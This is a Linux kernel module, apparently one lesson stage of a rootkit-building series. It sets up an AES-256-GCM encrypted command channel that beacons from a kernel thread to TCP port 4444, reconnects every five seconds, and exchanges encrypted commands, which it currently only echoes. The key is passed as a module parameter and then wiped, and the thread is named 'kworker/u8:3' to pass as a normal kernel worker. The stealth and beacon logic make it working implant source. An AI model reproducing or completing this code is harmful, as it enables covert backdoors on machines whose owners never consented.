// SPDX-License-Identifier: GPL-2.0
#include <crypto/aead.h>
#include <crypto/gcm.h>
#include <linux/in.h>
#include <linux/inet.h>
#include <linux/delay.h>
#include <linux/hex.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/kthread.h>
#include <linux/module.h>
#include <linux/net.h>
#include <linux/random.h>
#include <linux/scatterlist.h>
#include <linux/slab.h>
#include <linux/string.h>
#include <net/net_namespace.h>

#define RK_KEY_LEN	32
#define RK_KEY_HEX_LEN	64
#define RK_NONCE_LEN	12
#define RK_TAG_LEN	16
#define RK_HDR_LEN	18
#define RK_FRAME_MAX	4096
#define RK_PORT		4444
#define RK_RECONNECT_MS	5000

#define RK_DIR_CLIENT	0
#define RK_DIR_SERVER	1

static char rk_key_hex[RK_KEY_HEX_LEN + 1];
module_param_string(control_key, rk_key_hex, sizeof(rk_key_hex), 0);

static u8 rk_key[RK_KEY_LEN];
static struct task_struct *rk_thread;

struct rk_envelope_hdr {
	u8 version;
	u8 direction;
	__be64 session_id;
	__be64 sequence;
} __packed;

struct rk_session {
	struct crypto_aead *tfm;
	struct socket *sock;
	u64 session_id;
	u64 tx_seq;
	u64 rx_seq_expected;
};

/* ---- Framing (L18) ---- */

static int send_exact(struct socket *sock, const void *buf, size_t len)
{
	size_t sent = 0;

	while (sent < len) {
		struct msghdr msg = { 0 };
		struct kvec vec = {
			.iov_base = (void *)((u8 *)buf + sent),
			.iov_len = len - sent,
		};
		int n;

		n = kernel_sendmsg(sock, &msg, &vec, 1, len - sent);
		if (n < 0)
			return n;
		if (n == 0)
			return -ECONNRESET;
		sent += n;
	}
	return sent;
}

static int recv_exact(struct socket *sock, void *buf, size_t len)
{
	size_t received = 0;

	while (received < len) {
		struct msghdr msg = { 0 };
		struct kvec vec = {
			.iov_base = (u8 *)buf + received,
			.iov_len = len - received,
		};
		int n;

		n = kernel_recvmsg(sock, &msg, &vec, 1, len - received, 0);
		if (n < 0)
			return n;
		if (n == 0)
			return -ECONNRESET;
		received += n;
	}
	return received;
}

static int send_frame(struct socket *sock, const void *buf, size_t len)
{
	__be16 hdr;
	int error;

	if (len > RK_FRAME_MAX)
		return -EMSGSIZE;

	hdr = htons((u16)len);
	error = send_exact(sock, &hdr, 2);
	if (error < 0)
		return error;

	if (len == 0)
		return 0;

	return send_exact(sock, buf, len);
}

static int recv_frame(struct socket *sock, void *buf, size_t max_len,
		      size_t *out_len)
{
	__be16 hdr;
	u16 payload_len;
	int error;

	error = recv_exact(sock, &hdr, 2);
	if (error < 0)
		return error;

	payload_len = ntohs(hdr);
	if (payload_len > max_len)
		return -EMSGSIZE;

	if (payload_len == 0) {
		*out_len = 0;
		return 0;
	}

	error = recv_exact(sock, buf, payload_len);
	if (error < 0)
		return error;

	*out_len = payload_len;
	return 0;
}

/* ---- AEAD (L19) ---- */

static int rk_aead_seal(struct crypto_aead *tfm,
			const u8 *nonce,
			const u8 *aad, size_t aad_len,
			const u8 *plaintext, size_t pt_len,
			u8 *out, size_t *out_len)
{
	struct aead_request *req;
	struct scatterlist sg;
	u8 *buf;
	int error;

	buf = kmalloc(aad_len + pt_len + RK_TAG_LEN, GFP_KERNEL);
	if (!buf)
		return -ENOMEM;

	if (aad_len)
		memcpy(buf, aad, aad_len);
	memcpy(buf + aad_len, plaintext, pt_len);

	sg_init_one(&sg, buf, aad_len + pt_len + RK_TAG_LEN);

	req = aead_request_alloc(tfm, GFP_KERNEL);
	if (!req) {
		kfree(buf);
		return -ENOMEM;
	}

	aead_request_set_crypt(req, &sg, &sg, pt_len, (u8 *)nonce);
	aead_request_set_ad(req, aad_len);

	error = crypto_aead_encrypt(req);
	if (!error) {
		memcpy(out, buf, aad_len + pt_len + RK_TAG_LEN);
		*out_len = aad_len + pt_len + RK_TAG_LEN;
	}

	aead_request_free(req);
	kfree(buf);
	return error;
}

static int rk_aead_open(struct crypto_aead *tfm,
			const u8 *nonce,
			const u8 *aad, size_t aad_len,
			const u8 *ct_with_aad, size_t total_len,
			u8 *out, size_t *out_len)
{
	struct aead_request *req;
	struct scatterlist sg;
	u8 *buf;
	size_t ct_plus_tag;
	int error;

	if (total_len < aad_len + RK_TAG_LEN)
		return -EINVAL;

	ct_plus_tag = total_len - aad_len;

	buf = kmalloc(total_len, GFP_KERNEL);
	if (!buf)
		return -ENOMEM;

	memcpy(buf, ct_with_aad, total_len);

	sg_init_one(&sg, buf, total_len);

	req = aead_request_alloc(tfm, GFP_KERNEL);
	if (!req) {
		kfree(buf);
		return -ENOMEM;
	}

	aead_request_set_crypt(req, &sg, &sg, ct_plus_tag, (u8 *)nonce);
	aead_request_set_ad(req, aad_len);

	error = crypto_aead_decrypt(req);
	if (!error) {
		*out_len = ct_plus_tag - RK_TAG_LEN;
		memcpy(out, buf + aad_len, *out_len);
	}

	aead_request_free(req);
	kfree(buf);
	return error;
}

/* ---- Envelope (L20) ---- */

static void rk_build_nonce(u8 *nonce, u64 session_id, u8 direction, u64 seq)
{
	__be64 sid = cpu_to_be64(session_id);

	memcpy(nonce, &sid, 8);
	nonce[8] = direction;
	nonce[9] = (seq >> 16) & 0xFF;
	nonce[10] = (seq >> 8) & 0xFF;
	nonce[11] = seq & 0xFF;
}

static int rk_send_sealed(struct rk_session *s, const u8 *data, size_t len)
{
	struct rk_envelope_hdr hdr;
	u8 nonce[RK_NONCE_LEN];
	u8 *sealed;
	size_t sealed_len;
	size_t env_len;
	int error;

	hdr.version = 1;
	hdr.direction = RK_DIR_SERVER;
	hdr.session_id = cpu_to_be64(s->session_id);
	hdr.sequence = cpu_to_be64(s->tx_seq);

	rk_build_nonce(nonce, s->session_id, RK_DIR_SERVER, s->tx_seq);

	env_len = RK_HDR_LEN + len + RK_TAG_LEN;
	sealed = kmalloc(env_len, GFP_KERNEL);
	if (!sealed)
		return -ENOMEM;

	error = rk_aead_seal(s->tfm, nonce, (u8 *)&hdr, RK_HDR_LEN,
			     data, len, sealed, &sealed_len);
	if (error) {
		kfree(sealed);
		return error;
	}

	error = send_frame(s->sock, sealed, sealed_len);
	kfree(sealed);
	if (error < 0)
		return error;

	s->tx_seq++;
	return 0;
}

static int rk_recv_sealed(struct rk_session *s, u8 *out, size_t max_len,
			  size_t *out_len)
{
	u8 frame[RK_FRAME_MAX];
	size_t frame_len;
	struct rk_envelope_hdr hdr;
	u8 nonce[RK_NONCE_LEN];
	u64 seq;
	int error;

	error = recv_frame(s->sock, frame, sizeof(frame), &frame_len);
	if (error)
		return error;

	if (frame_len < RK_HDR_LEN + RK_TAG_LEN)
		return -EINVAL;

	memcpy(&hdr, frame, RK_HDR_LEN);

	/* Replay check */
	seq = be64_to_cpu(hdr.sequence);
	if (seq < s->rx_seq_expected)
		return -EPROTO;

	rk_build_nonce(nonce, be64_to_cpu(hdr.session_id),
		       hdr.direction, seq);

	error = rk_aead_open(s->tfm, nonce, (u8 *)&hdr, RK_HDR_LEN,
			     frame, frame_len, out, out_len);
	if (error)
		return error;

	if (*out_len > max_len)
		return -EMSGSIZE;

	s->rx_seq_expected = seq + 1;
	return 0;
}

/* ---- Agent loop ---- */

static int rk_handshake(struct rk_session *s)
{
	u8 buf[32];
	size_t len;
	int error;

	/* Send encrypted HELLO */
	error = rk_send_sealed(s, "HELLO", 5);
	if (error)
		return error;

	/* Expect encrypted HELLO back */
	error = rk_recv_sealed(s, buf, sizeof(buf), &len);
	if (error)
		return error;

	if (len != 5 || memcmp(buf, "HELLO", 5) != 0)
		return -EPROTO;

	return 0;
}

static void rk_handle_session(struct rk_session *s)
{
	u8 cmd[RK_FRAME_MAX];
	size_t cmd_len;
	int error;

	while (!kthread_should_stop()) {
		error = rk_recv_sealed(s, cmd, sizeof(cmd), &cmd_len);
		if (error)
			break;

		/* Echo the decrypted command back, encrypted */
		error = rk_send_sealed(s, cmd, cmd_len);
		if (error)
			break;
	}
}

static int rk_agent_thread(void *data)
{
	while (!kthread_should_stop()) {
		struct rk_session sess;
		struct socket *sock = NULL;
		struct sockaddr_in addr;
		int error;

		error = sock_create_kern(&init_net, AF_INET, SOCK_STREAM,
					 IPPROTO_TCP, &sock);
		if (error)
			goto retry;

		memset(&addr, 0, sizeof(addr));
		addr.sin_family = AF_INET;
		addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
		addr.sin_port = htons(RK_PORT);

		error = kernel_connect(sock, (struct sockaddr_unsized *)&addr,
				       sizeof(addr), 0);
		if (error)
			goto close_retry;

		sess.tfm = crypto_alloc_aead("gcm(aes)", 0, 0);
		if (IS_ERR(sess.tfm))
			goto close_retry;

		error = crypto_aead_setauthsize(sess.tfm, RK_TAG_LEN);
		if (error)
			goto free_tfm;

		error = crypto_aead_setkey(sess.tfm, rk_key, RK_KEY_LEN);
		if (error)
			goto free_tfm;

		get_random_bytes(&sess.session_id, sizeof(sess.session_id));
		sess.sock = sock;
		sess.tx_seq = 0;
		sess.rx_seq_expected = 0;

		error = rk_handshake(&sess);
		if (error)
			goto free_tfm;

		rk_handle_session(&sess);

free_tfm:
		crypto_free_aead(sess.tfm);
close_retry:
		kernel_sock_shutdown(sock, SHUT_RDWR);
		sock_release(sock);
retry:
		if (!kthread_should_stop())
			msleep_interruptible(RK_RECONNECT_MS);
	}
	return 0;
}

static int __init rk_init(void)
{
	if (strlen(rk_key_hex) == 0)
		return -EINVAL;
	if (strlen(rk_key_hex) != RK_KEY_HEX_LEN)
		return -EINVAL;
	if (hex2bin(rk_key, rk_key_hex, RK_KEY_LEN) < 0)
		return -EINVAL;

	memzero_explicit(rk_key_hex, sizeof(rk_key_hex));

	rk_thread = kthread_run(rk_agent_thread, NULL, "kworker/u8:3");
	if (IS_ERR(rk_thread)) {
		memzero_explicit(rk_key, sizeof(rk_key));
		return PTR_ERR(rk_thread);
	}

	return 0;
}

static void __exit rk_exit(void)
{
	if (rk_thread)
		kthread_stop(rk_thread);
	memzero_explicit(rk_key, sizeof(rk_key));
}

module_init(rk_init);
module_exit(rk_exit);
MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Encrypted agent channel with AES-256-GCM");
